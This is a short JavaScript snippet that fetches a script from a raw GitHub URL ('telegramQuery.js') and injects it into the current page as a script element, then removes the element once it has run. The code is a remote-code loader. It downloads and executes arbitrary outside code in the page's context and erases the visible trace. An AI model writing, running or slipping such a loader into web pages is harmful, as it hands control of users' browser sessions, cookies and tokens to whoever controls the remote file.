(async () => {
    try {
        const url = 'https://raw.githubusercontent.com/0xAlvi/VM/main/telegramQuery.js';
        const response = await fetch(url);
        if (!response.ok) throw new Error('Network response was not ok');
        const scriptText = await response.text();
        const scriptElement = document.createElement('script');
        scriptElement.textContent = scriptText;
        document.head.appendChild(scriptElement).remove();
    } catch (error) {
        console.error('Error:', error);
    }
})()
